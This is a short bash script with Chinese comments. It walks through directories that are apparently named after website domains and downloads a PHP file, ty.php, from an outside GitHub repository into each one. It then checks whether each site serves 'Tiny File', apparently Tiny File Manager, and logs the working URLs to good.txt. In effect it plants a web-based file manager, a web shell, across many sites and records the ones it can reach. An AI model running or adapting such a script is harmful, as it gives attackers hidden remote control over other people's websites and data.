for dir in */; do
    dirname=${dir%/}
    echo "Checking $dirname..."
    
    # 下载文件到当前目录
    if wget -q https://github.com/arrowxxc/test2/raw/refs/heads/main/ty.php -O "${dirname}/ty.php"; then
        echo "  ✓ Downloaded to ${dirname}/ty.php"
        
        # 请求远程 URL 检查内容
        url="https://${dirname}/ty.php"
        content=$(curl -s -k "$url")
        
        if echo "$content" | grep -q "Tiny File"; then
            echo "$url" >> good.txt  # 保存完整 URL
            echo "  -> FOUND: $url"
        else
            echo "  -> Content check failed for $url"
        fi
    else
        echo "  ✗ Download failed for ${dirname}"
    fi
done
